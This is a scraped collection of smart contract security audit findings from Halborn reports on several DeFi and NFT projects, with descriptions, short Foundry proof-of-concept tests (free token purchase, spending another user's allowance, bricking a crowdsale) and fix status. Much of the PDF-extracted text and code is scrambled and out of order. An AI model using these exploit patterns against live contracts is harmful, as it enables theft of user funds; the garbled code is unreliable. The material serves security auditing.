M  initialize(address,address,address) (external) Test 1: Creating a public sale Initially, the price set was 1337. In this test, user1 created a public sale by calling the createPublicSale But then user1 called function. updateListing and updated the price to 3000 USD. Then, user2 bought the token successfully by calling the placeBid function. In the image below, we can see how the 95% of the tokens were transferred to user1 and the 5% to the treasury address: G N I T S E T L A U N A M On the other hand, it is worth mentioning that the parameter bidValue is useless as long as the user calling placeBid is providing a msg.value > 0: Listing 18: Marketplace.sol (Lines 308,310) 297 function placeBid ( 298 299 300 301 uint256 listingId , address buyerTokenWallet , string calldata currency , uint256 bidValue 43 302 ) external payable { 303 304 305 Listing storage listing = _listings [ listingId ]; require ( listing . price > 0, ERR_LISTING_NOT_EXISTS ); require ( listing . sellerTokenWallet != buyerTokenWallet , 306 307 308 309 310 311 ERR_CANNOT_BUY_OWN_LISTING ); require ( _isValidWallet ( buyerTokenWallet ) , ERR_UNSUPPORTED_TOKEN_WALLET ); if ( msg . value > 0) { require ( currency . equals ( _nativeCurrency ) , \" NFTMarketplace : Currency Symbol is not Native currency \"); bidValue = msg . value ; } The payment can also be done with an ERC20 token, in this case, with USDC ERC20 tokens: G N I T S E T L A U N A M 44 Test 2: Creating a private sale this user1 test, the In created The price createPrivateSale function setting the user2 as the buyer. set was 3000. Then, user2 bought the token successfully by calling the placeBid function: calling private sale by a We can see how the sale is restricted just for the user2: G N I T S E T L A U N A M 45 Test 3: Creating an auction, payment with NATIVE currency function. In this test, user1 created an auction sale by calling the createAuction But then user1 called updateListing and updated the price to 5000 USD. Then multiple users placed a bid using NATIVE currency: Initially the price set was 3000. In the image above we can appreciate how the ETH amount was discounted from their balance and sent to the smart contract right after placing the highest bid. We can also see how the bid was returned also to the outbid users. We have also made sure that the seller cannot place any bid in his listing: G N I T S E T L A U N A M 46 G N I T S E T L A U N A M 47 Test 4: Creating an auction, payment with TOKEN currency Initially, the price set was 3000. In this test, user1 created an auction sale by calling the createAuction But then user1 called function. updateListing and updated the price to 5000 USD. Then multiple users placed a bid using TOKEN currency. 2 different issues were found which are explained in:  INCORRECT LOGIC LEADS TO DOS IN AUCTION SALES  OUTBID USER DOES NOT RECEIVE BACK HIS FUNDS G N I T S E T L A U N A M 48 4.7 RARIOMARKETPLACECONFIG CONTRACT The contract RarioMarketplaceConfig inherits from MarketplaceConfig and is used to configure different parameters used by the RarioMarketplace contract. The contract RarioMarketplaceConfig contains the following functions:  From MarketplaceConfig  _existsUserWallet(address) (internal)  _setAllowExternalWallets(bool) (private)  _setAuctionExtensionDuration(uint256) (private)  _setAuctionPercentIncrementInBasisPoints(uint256) (private)  _setGasLimits(uint256,uint256,uint256) (private)  _setListingExpiry(uint256) (private)  _setPlatformFees(uint256) (private)  _setTokenContract(address) (private)  _setTreasury(address) (private)  _setUserDB(address) (private)  getAllowExternalWallets() (external)  getAuctionExtensionDuration() (external)  getAuctionPercentIncrementInBasisPoints() (external)  getGasLimits() (external)  getListingExpiry() (external)  getPlatformFees() (external)  getTokenAddress() (external)  getTreasuryAddress() (external)  getUserDBAddress() (external)  initializeMarketplaceConfig(address,address,address) (internal)  isValidWallet(address) (external)  setAllowExternalWallets(bool) (external)  setAuctionExtensionDuration(uint256) (external)  setAuctionPercentIncrementInBasisPoints(uint256) (external)  setGasLimits(uint256,uint256,uint256) (external)  setListingExpiry(uint256) (external) 49 G N I T S E T L A U N A M  setPlatformFees(uint256) (external)  setTokenAddress(address) (external)  setTreasuryAddress(address) (external)  setUserDBAddress(address) (external)  From RarioMarketplaceConfig  initialize(address,address,address,address) (external) Test: setAllowExternalWallets - True, setPlatformFees - 5000 (50%) this In test, MarketplaceConfig contract: have we set the following configuration in the  marketplaceConfig.setAllowExternalWallets(True, {'from': owner})  marketplaceConfig.setPlatformFees(5000, {'from': owner}) Below we can see, how the platform fee is now 50% as the 50% of the payment goes to the treasury address. On the other hand, we can also see how external wallets are allowed to bid without having added them previously in the RarioUsers contract: G N I T S E T L A U N A M 50 4.8 RARIOPOLYGONTOKEN CONTRACT contract The RarioPolygonNFT at the same time inherits from RarioNFT contract. RarioPolygonToken inherits from RarioPolygonNFT. The contract RarioPolygonToken contains the following functions:  From RarioPolygonNFT  deposit(address,bytes) (external)  encodeTokenMetadata(uint256) (external)  initializeRarioPolygonNFT(string,string,address,address) (internal)  withdraw(uint256) (external)  withdrawBatch(uint256[]) (external)  withdrawWithMetadata(uint256) (external)  From RarioNFT  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeBooleanValue(uint256,string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getAttributeNumberValue(uint256,string) (external)  getAttributeTextValue(uint256,string) (external)  initializeRarioNFT(string,string,address) (internal)  isApprovedForAll(address,address) (public)  isContractApprovedForAll(address) (external)  mint(address,uint256) (external)  safeMint(address,uint256) (external)  safeMint(address,uint256,bytes) (external)  setContractApprovalForAll(address,bool) (external)  From RarioPolygonToken  initialize(address,address,address,string,string) (external) The contract RarioPolygonNFT correctly follows the Polygon Mintable Assets documentation: 51 G N I T S E T L A U N A M 1. The contract RarioPolygonNFT has the same structure as ChildMintableERC721.sol 2. The RarioPolygonNFT contract withdraw and mint. RarioNFT contract and can only be called by an OPERATOR. deposit, the The mint function is inherited, though, from functions contains Listing 19: RarioNFT.sol (Lines 40) 39 40 41 42 function mint ( address to , uint256 tokenId ) external virtual { _checkRole ( OPERATOR , msgSender () ); _mint ( to , tokenId ); } is worth mentioning, MINT FUNCTION IN It page RARIOPOLYGONNFT DOES NOT VERIFY IF TOKEN WAS WITHDRAWN that the function mint in RarioPolygonNFT does not verify if the token was withdrawn previously as it is done in ChildMintableERC721.sol described findings the in as G N I T S E T L A U N A M 52 4.9 RARIOETHEREUMTOKEN CONTRACT contract The RarioEthereumNFT at the same time inherits from RarioNFT contract. RarioEthereumToken inherits from RarioEthereumNFT. The contract RarioEthereumToken contains the following functions:  From RarioEthereumNFT  exists(uint256) (external)  initializeRarioEthereumNFT(string,string,address,address) (internal)  mint(address,uint256) (external)  mint(address,uint256,bytes) (external)  setTokenMetadata(uint256,bytes) (internal)  version() (external)  From RarioNFT  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeBooleanValue(uint256,string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getAttributeNumberValue(uint256,string) (external)  getAttributeTextValue(uint256,string) (external)  initializeRarioNFT(string,string,address) (internal)  isApprovedForAll(address,address) (public)  isContractApprovedForAll(address) (external)  safeMint(address,uint256) (external)  safeMint(address,uint256,bytes) (external)  setContractApprovalForAll(address,bool) (external)  From RarioEthereumToken  initialize(address,address,address,string,string) (external) The contract RarioEthereumNFT correctly follows the Polygon Mintable Assets documentation: 53 G N I T S E T L A U N A M 1. The contract RarioEthereumNFT has the same structure as DummyMintableERC721.sol G N I T S E T L A U N A M 54 4.10 RARIOUSERS CONTRACT The contract RarioUsers inherits from UserDB. This contract is used like a database to keep control of all the users and wallets. The contract RarioUsers contains the following functions which are all only callable by the OPERATOR role:  From UserDB  addUser(uint256,address) (external)  existsUserId(uint256) (external)  existsUserWallet(address) (external)  getUserByAddress(address) (external)  getUserById(uint256) (external)  getUserByIndex(uint256) (external)  getUserCount() (external)  updateUser(uint256,address) (external)  From RarioUsers  initialize(address) (external) G N I T S E T L A U N A M All the functions are working as expected as can be seen above except updateUser which is not validating if the address of the wallet was 55 already added, as described in the findings page UPDATEUSER FUNCTION MISSING REQUIRE STATEMENT. G N I T S E T L A U N A M 56 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Informational"
        ]
    },
    {
        "title": "3.1 MISSING ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf",
        "body": "Address validation at many places in contracts LaunchpadxIDO.sol and LaunchpadxFactory.sol. Lack of zero address validation has been found at many instances when assigning user supplied address values to state variables directly. Recommendation: Add proper address validation when every state variable assignment done from user supplied input. Code Location: LaunchpadxFactory.sol: Line #14 Line #22 LaunchpadxIDO.sol: Line #80 Line #81 Line #82 Line #83 Line #103 8 Line #107 ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpadx_SmartContract",
            "Severity: Low"
        ]
    },
    {
        "title": "are being ig",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract LaunchpadxIDO.sol, there are few instances where external methods are being called and return value(bool) are being ig- nored. Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 9 Code Location: LaunchpadxIDO.sol: Ignoring boolean return type Line #208 Line #231 Line #237 ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpadx_SmartContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "scoped been has run the all on 10 11 MythX: LaunchpadxFactory.sol LauncpadxIDO.sol 12 LaunchpadxTicket.sol 13 THANK YOU FOR CHOOSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf",
        "body": "and MythX Slither con- tracts(LaunchpadxTicket.sol, LaunchpadxFactory.sol and LaunchpadxIDO. sol) scoped been has run the all on 10 11 MythX: LaunchpadxFactory.sol LauncpadxIDO.sol 12 LaunchpadxTicket.sol 13 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "BSCEX_Launchpadx_SmartContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANY USER CAN PURCHASE CROWDSALE TOKENS FOR FREE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Crowdsale contract enables swapping payment token for purchasable tokens. The amount of tokens to be paid is calculated with the following formula when calling the buyTokens() function: Listing 1: Price Formula 1 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; The problem is, the payment can return zero if (tokens * price * uint256( usdPrice)) is less than (10 ** priceFeedDecimals / 10 ** tokenDecimals). Therefore, any user can purchase crowdsale tokens for free as they find an optimal value for tokens variable. Proof of Concept: Listing 2: Crowdsale.t.sol - Test Case uint256 preFltkBalance = floinToken . balanceOf ( user1 ); uint256 preUsdtBalance = mockUSDT . balanceOf ( user1 ); vm . startPrank ( user1 ); uint256 allowedBalance = 1 e18 ; mockUSDT . approve ( address ( crowdsale ) , allowedBalance ); 1 function testFail_crowdsaleBuyTokensForFreePoC () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 crowdsale . buyTokens (2 e13 , user1 ); unchecked { ++ i ; for ( uint i ; i < 5000; ) { } } 16 15 16 17 18 19 20 21 } uint256 postFltkBalance = floinToken . balanceOf ( user1 ); uint256 postUsdtBalance = mockUSDT . balanceOf ( user1 ); assertGt ( postFltkBalance - preFltkBalance , 0) ; assertLt ( postUsdtBalance , preUsdtBalance ); Screenshots: Code Location: Listing 3: Crowdsale.sol (Lines 116,126) 109 function buyTokens ( uint256 tokens , address recipient ) public  whenNotPaused onlyWhileOpen { 110 require ( msg . sender == recipient || initiatorWhitelist [ msg .  sender ], \" Crowdsale :: buyTokens : Not allowed .\" ); 111 require ( tokens > 0, \" Crowdsale :: buyTokens : tokens cannot be 0 \"  ); 112 113 114 int256 usdPrice = getLatestPrice () ; require ( usdPrice > 0, \" Crowdsale :: buyTokens : negative usd  price \" ); 115 116 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; 117 118 uint256 allowance = paymentToken . allowance ( msg . sender , address  ( this )); 17 119 require ( allowance >= payment , \" Crowdsale :: buyTokens : Allowance  too low \" ); 120 121 122 uint256 remaining = remainingTokens () ; require ( remaining >= tokens , \" Crowdsale :: buyTokens : Not enough  tokens left \"); 123 124 125 126 paymentRaised += payment ; paymentToken . safeTransferFrom ( msg . sender , paymentCollector ,  payment ); 127 128 129 130 } token . safeTransferFrom ( tokenWallet , recipient , tokens ); emit TokenPurchase ( msg . sender , recipient , payment , tokens ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: Consider correcting the price formula by taking decimals of token and price feed into account. Remediation Plan: SOLVED: The Floin team solved the issue by introducing the new payment calculation function (getPayment()) into their code. Commit ID: 822726a467a789a621736790b4cf44e2e62a48c9 18 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Critical"
        ]
    },
    {
        "title": "REWARD MODIFICATION LEADS TO REWARDS INFLATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Staking contract implements a rewarding feature to help to distribute extra rewards to protocol users. The reward speed parameter is set inside the constructor when deploying the contract. The contract owner can modify rewarding parameters by calling the set() function. However, the set() function tries to update pool rewards, since it also calls the updatePoolRewards() function. Therefore, rewards are miscal- culated, and all stake owners get inflated rewards. Proof of Concept: Listing 4: FLTKStaking.t.sol - Test Case vm . startPrank ( user1 ); uint256 [] memory depositIds = new uint256 [](2) ; stakingToken . increaseAllowance ( address ( fltkStaking ) , 3 e18 ); depositIds [0] = fltkStaking . deposit (1) ; skip (1001) ; depositIds [1] = fltkStaking . deposit (2 e18 ); // fltkStaking . claimRewards ( depositIds ) ; // 1001 uint256 calculatedReward = fltkStaking . pendingRewardForUser ( 1 function testFail_miscalculatedRewardsSetFunctionPoC () public { 2 3 4 5 6 7 8 9  depositIds , user1 ); 10 vm . stopPrank () ; 11 12 13 14 15 16 17 18 19 20 } vm . prank ( deployer ); fltkStaking . set (0 , 1 , 1 e3 ); skip (1) ; vm . prank ( user1 ); fltkStaking . claimRewards ( depositIds ); // 1001000 uint256 finalRewardBalance = rewardToken . balanceOf ( user1 ); assertEq ( finalRewardBalance , calculatedReward ); 19 Screenshots: Code Location: Listing 5: FLTKStaking.sol (Line 358) 351 function set ( uint256 _rewardsPerSecond , uint256 _depositBucketSize  , uint256 _rewardSlashingInterval ) 352 public 353 onlyOwner 354 { 355 require ( _depositBucketSize > 0, \" FLTKStaking :: set : Deposit  bucket size has to be greater than 0\" ); 356 require ( _rewardSlashingInterval > 0, \" FLTKStaking :: set : Reward  slashing interval has to greater than 0 \"); 357 358 359 360 361 362 } updatePoolRewards () ; rewardsPerSecond = _rewardsPerSecond ; depositBucketSize = _depositBucketSize ; rewardSlashingInterval = _rewardSlashingInterval ; Risk Level: Likelihood - 4 Impact - 4 20 Recommendation: Consider correcting the updatePoolRewards() function for set() call since it inflates rewards. Remediation Plan: NOT APPLICABLE: This finding is not applicable, as the test scenario in the Proof of Concept section describes that the _rewardSlashingInterval variable is decreasing from 1e6 to 1e3. According to the reward formula, the denumerator will be less than the previous value. In this case, more rewards are expected as a result. 21 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: High"
        ]
    },
    {
        "title": "FIXED PRICE FOR EUR/USD PAIR CAN AFFECT CROWDSALE TOKEN PRICES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The payment calculation formula of Crowdsale contract uses fixed price for EUR/USD pair. The price variable represents the price of EUR/USD but this variable is immutable. It means the price will be defined during contract deployment. The problem is EUR/USD price can change over time. If Euro loses value against United States Dollar, then, users will get less Crowdsale tokens than they should have. Proof of Concept: Before Value Loss: Listing 6: EUR/USD prices before value loss 1 Chainlink Oracle EUR / USD price : 106690000 2 Chainlink Oracle USDC / USD price : 98991589 3 Floin Fixed EUR / USD price : 106690000 Alice decides to buy 200_000_000_000 Crowdsale FLTK tokens:  (200_000_000_000 * 106690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice will get 200_000_000_000 FLTK Crowdsale Tokens for 21. 22 After Value Loss: Listing 7: EUR/USD prices after value loss 1 Chainlink Oracle EUR / USD price : 96690000 2 Chainlink Oracle USDC / USD price : 98991589 3 Floin Fixed EUR / USD price : 106690000 Alice buys 200_000_000_000 Crowdsale FLTK tokens:  (200_000_000_000 * 106690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice will get 200_000_000_000 FLTK Crowdsale Tokens for 21.  However, actual price calculation should have been:  (200_000_000_000 * 96690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice should have get 200_000_000_000 FLTK Crowd- sale Tokens for 19. Code Location: Listing 8: Crowdsale.sol (Line 102) address _paymentCollector , address _tokenWallet , address _priceFeed , ERC20 _token , ERC20 _paymentToken , uint256 _price , uint256 _openingTime , uint256 _closingTime 84 constructor ( 85 86 87 88 89 90 91 92 93 ) { 94 95 96 97  ; 98 99 100 if ( _paymentCollector == address (0) ) revert AddressZero () ; if ( _tokenWallet == address (0) ) revert AddressZero () ; if ( address ( _token ) == address (0) ) revert AddressZero () ; if ( address ( _paymentToken ) == address (0) ) revert AddressZero () if ( _priceFeed == address (0) ) revert AddressZero () ; if ( _price == 0) revert InvalidPrice () ; if ( _closingTime <= block . timestamp ) revert InvalidClosingTime 23  () ; 101 102 price = _price ; Listing 9: Crowdsale.sol (Line 131) 131 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; Risk Level: Likelihood - 3 Impact - 3 Recommendation: In order not to be affected by this vulnerability, the instant value of this specific pair can be fetched over price oracles and this value can be used in the code. Remediation Plan: SOLVED: The Floin team solved the issue by introducing the new payment calculation function (getPayment()) into their code. The contract will get the EUR/USD price information from Chainlink Price Oracle with this new change. Commit ID: 822726a467a789a621736790b4cf44e2e62a48c9 24 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISCALCULATION OF DEPOSIT ID",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FLTKStaking.sol contract, when a user tries to stake their assets by calling the deposit function, that function calculates deposit ID with the following formula: Listing 10: Deposit ID Calculation Formula 1 uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; Division before multiplication is used in the formula above. Therefore, there is a precision loss and userDepositId might be miscalculated. Proof of Concept: 1. Assume that depositBucketSize variable is 100. 2. Assume that block.timestamp is 1677687861. 3. The calculation will return 1677687800 as depositId. However, if we try to execute the multiplication before division, it was going to return 1677687861 which is the correct time. Screenshots: 25 Code Location: Listing 11: FLTKStaking.sol (Line 152) 148 function deposit ( uint256 _amount ) public returns ( uint256 ) { 149 require ( _amount > 0, \" FLTKStaking :: deposit : Amount cannot be 0  \" ); 150 151 152 address _userAddress = _getUser () ; uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; 153 UserDeposit storage user = userDeposit [ _userAddress ][  userDepositId ]; 154 155 uint256 [] memory _depositIds = new uint256 [](1) ; _depositIds [0] = userDepositId ; Risk Level: Likelihood - 4 Impact - 2 Recommendation: Consider executing the multiplication before the division operation to prevent miscalculating deposit IDs. Remediation Plan: NOT APPLICABLE: At the end of the discussion with the Floin team, it was decided that this finding was not a vulnerability, but an intentional The loss of precision here is intentionally done to include design. depositors in the same group. 26 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Medium"
        ]
    },
    {
        "title": "DEPOSITFOR FUNCTION USES A DANGEROUS MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The depositFor function uses a risky impersonateUser modifier to deposit on behalf of another user. If someone gives allowance to the FLTKStaking contract, any other user can spend these allowances by calling the depositFor function by providing a depositor address. An example scenario: 1. Alice decides to stake 10e18 Staking Tokens on FLTKStaking contract. 2. She calls stakingtoken.approve(address(FLTKStaking), 10e18) func- tion to increase allowance. 3. She stakes 3e18 Staking Tokens and decides not to stake the other portion of the contract. 4. Bob calls depositFor(address(Alice), 7e18) function with the given parameters. 5. As a result, Alices Staking Tokens will be deposited into FLTKStaking contract. Proof of Concept: Listing 12: FLTKStaking.t.sol - Test Case vm . startPrank ( user1 ); stakingToken . increaseAllowance ( address ( fltkStaking ) , 10 e18 ); fltkStaking . deposit (3 e18 ); skip (1) ; vm . stopPrank () ; 1 function test_depositForSomeoneElse () public { 2 3 4 5 6 7 8 9 10 11 } vm . startPrank ( user2 ); fltkStaking . depositFor ( address ( user1 ) , 7 e18 ); vm . stopPrank () ; 27 Screenshots: Code Location: Listing 13: FLTKStaking.sol (Line 175) 175 function depositFor ( address _user , uint256 _amount ) external  impersonateUser ( _user ) returns ( uint256 ) { 176 177 } return deposit ( _amount ); Listing 14: FLTKStaking.sol (Line 372) 371 modifier impersonateUser ( address _user ) { 372 373 374 375 } _userContext = _user ; _; _userContext = address (0) ; 28 Risk Level: Likelihood - 4 Impact - 2 Recommendation: It is suggested to remove the dangerous impersonateUser modifier and depositFor() function to prevent this attack to occur. Remediation Plan: SOLVED: The Floin team solved the issue by removing the depositFor func- tion from their contract to solve this finding. Commit ID: 5af6890d9dd9513c759541428ecbc2cd88ac6f56 29 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Medium"
        ]
    },
    {
        "title": "LATESTROUNDDATA MIGHT RETURN STALE RESULTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Across these contracts, Chainlinks latestrounddata API is being used. However, there is only a check on updatedAt variable. This could lead to stale prices according to the Chainlink documentation:  getrounddata-return-values Code Location: Listing 15: Crowdsale.sol (Line 179) ( /* uint80 roundId */ , int256 answer , /* uint256 startedAt */ , /* uint256 updatedAt */ , /* uint80 answeredInRound */ ) = priceFeed . latestRoundData () ; 177 function getLatestPrice () public view returns ( int ) { 178 179 180 181 182 183 184 185 186 187 188 189 190 } 191 return answer ; Risk Level: Likelihood - 2 Impact - 3 30 Recommendation: It is recommended to apply following checks too: Listing 16: additional checks 1 require ( answeredInRound >= roundID , \" stale price \" ); 2 require ( updatedAt > 0, \" incomplete round \"); Remediation Plan: SOLVED: The Floin team solved the issue by applying the above recommen- dation to solve this finding. Commit ID: db6bd3edb7802165d8f934e2a0cac7bce5bb4bed 31 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some ERC20 tokens make modifications to the standard implementations of their ERC20s transfer or balanceOf functions. One type of such token is deflationary tokens that charge a fee on every transfer() and transferFrom(). The protocol does not have incompatibility with fee-on-transfer tokens. When repaying debt to the treasury, the pre-fee amount is deducted, but the received amount might be lesser. As a result, token transfers for these assets may fail silently. It is mostly a problem for FLTKStaking contract since the users are expected to get exact amount at stake during withdraw() call. The deposit() call will update user stakes with the exact amount as well. Code Location: Listing 17: FLTKStaking.sol (Lines 163,165) 148 function deposit ( uint256 _amount ) public returns ( uint256 ) { 149 require ( _amount > 0, \" FLTKStaking :: deposit : Amount cannot be 0  \" ); 150 151 152 address _userAddress = _getUser () ; uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; 153 UserDeposit storage user = userDeposit [ _userAddress ][  userDepositId ]; 154 155 156 157 158 159 uint256 [] memory _depositIds = new uint256 [](1) ; _depositIds [0] = userDepositId ; if ( user . rewardDebt == 0) { depositIds [ _userAddress ]. push ( userDepositId ); } 32 160 161 162 163 updatePoolRewards () ; _saveRewards ( _depositIds ); stakingToken . safeTransferFrom ( _userAddress , address ( this ) ,  _amount ); 164 165 166 167 168 169 } user . amount += _amount ; user . rewardDebt = user . amount * accTokenPerShare / UNITS ; emit Deposit ( _userAddress , userDepositId , _amount ); return userDepositId ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: If support for fee-on-transfer tokens is desired, consider tracking bal- ances before and after the transfer to compute the actual received amount. Remediation Plan: RISK ACCEPTED: The Floin team accepted the risk of this finding as they will not be using any fee-on-transfer tokens in their protocol. 33 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Low"
        ]
    },
    {
        "title": "CENTRALIZED FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was determined that the setInitiator function of Crowdsale function is a centralized function. With this function, the contract owner can decide who can participate in Crowdsale earlier than other users in the protocol. It is a good practice to decentralized contract governance by avoiding excessive use of centralized functions. Code Location: Listing 18: Crowdsale.sol (Line 155) 153 function setInitiator ( address address_ , bool allowed ) public  onlyOwner { 154 require ( initiatorWhitelist [ address_ ] != allowed , \" Crowdsale ::  setInitiator : Already set \" ); 155 156 } initiatorWhitelist [ address_ ] = allowed ; Risk Level: Likelihood - 2 Impact - 2 34 Recommendation: Consider removing the setInitiator function to avoid centralization prob- lems. Remediation Plan: RISK ACCEPTED: The Floin team accepted the risk as the finding will only pose a risk if the Owner address is compromised. 35 ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Low"
        ]
    },
    {
        "title": "A PAUSER CAN BRICK CROWDSALE CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A malicious or compromised Pauser can call pause() and renouncePauser() to brick the contract and all assets can be frozen in the Crowdsale contract. Proof of Concept: Listing 19: Crowdsale.t.sol - Test Case vm . startPrank ( deployer ); crowdsale . pause () ; crowdsale . renounceOwnership () ; vm . stopPrank () ; 1 function test_pauserCanBrickContractPoC () public { 2 3 4 5 6 7 8 9 10 11 } vm . startPrank ( user1 ); mockUSDT . approve ( address ( crowdsale ) , 100 e6 ); crowdsale . buyTokens (1 e18 , address (0) ) ; vm . stopPrank () ; Screenshots: 36 Code Location: Listing 20: Crowdsale.sol (Line 13) 13 contract Crowdsale is Ownable , Pausable { Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider overriding renouncePauser function to prevent renouncing address to address(0). Furthermore, transferOwnership() function is not recom- mended to use. A two-Step Ownership Change pattern should be followed. (HAL-10) LACK OF TWO-STEP OWNERSHIP PATTERN finding for more Check: information. Remediation Plan: SOLVED: The Floin team solved the issue by implementing the Ownable2Step library as Access Control and overriding the renounceOwnership() function. Commit ID: a93f8e0bfefb338f5efe62d2540794ba5878eeac 37 3.10 (HAL-10) LACK OF TWO-STEP OWNERSHIP PATTERN - LOW ",
        "labels": [
            "Halborn",
            "Floin_Floins",
            "Severity: Informational"
        ]
    },
    {
        "title": "DENIAL OF SERVICE CAUSED BY NONREENTRANT MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following functions contain the nonReentrant modifier: - HighStreetPoolBase.stake() - HighStreetPoolBase.unstake() - HighStreetPoolBase.updateStakeLock() - HighStreetPoolBase.processRewards() - HighStreetCorePool.transferHighToken() - HighStreetCorePool.transferHighTokenFrom() When receiveVaultRewards() function is called the pendingVaultRewards of the stakers will be always different from 0. In this case, when HighStreetPoolBase.unstake() is called, the flow below will be executed: 1. HighStreetPoolBase.unstake() (nonReentrant) 2. ---- HighStreetCorePool._unstake() 3. -------- HighStreetPoolBase._unstake() 4. ------------ HighStreetPoolBase._sync() 5. ------------ HighStreetCorePool._processRewards() 6. ---------------- HighStreetCorePool._processVaultRewards() 7. -------------------- (nonReentrant again) HighStreetCorePool.transferHighToken() As we can see, in this case, HighStreetCorePool.transferHighToken() will be called by HighStreetPoolBase.unstake(), which is not possible as This only happens when both functions got the nonReentrant modifier. pendingVaultRewards > 0 as per the code below: Listing 1: HighStreetCorePool.sol (Lines 275) 258 function _processVaultRewards ( address _staker ) private { 259 User storage user = users [ _staker ]; 14 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 } uint256 pendingVaultClaim = pendingVaultRewards ( _staker ); if ( pendingVaultClaim == 0) return ; // read HIGH token balance of the pool via standard ERC20 interface uint256 highBalance = IERC20 ( HIGH ). balanceOf ( address ( this )); require ( highBalance >= pendingVaultClaim , \" contract HIGH balance too low \" ); // update ` poolTokenReserve ` only if this is a HIGH Core Pool if ( poolToken == HIGH ) { // protects against rounding errors poolTokenReserve -= pendingVaultClaim > poolTokenReserve ? poolTokenReserve : pendingVaultClaim ; } user . subVaultRewards = weightToReward ( user . totalWeight , vaultRewardsPerWeight ); // transfer fails if pool HIGH balance is not enough - which is a desired behavior transferHighToken ( _staker , pendingVaultClaim ); emit VaultRewardsClaimed ( msg . sender , _staker , pendingVaultClaim ); This would cause every single call to HighStreetPoolBase.unstake() to revert with the following error message: ReentrancyGuard: reentrant call Risk Level: Likelihood - 5 Impact - 5 Recommendation: to is remove recommended the It is HighStreetCorePool.transferHighToken() recommended for the HighStreetCorePool.transferHighTokenFrom() function. Both functions are internal. nonReentrant function. modifier The from same the 15 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID ffef2b7402a0e5308b8019727688a242a220443e 16 ",
        "labels": [
            "Halborn",
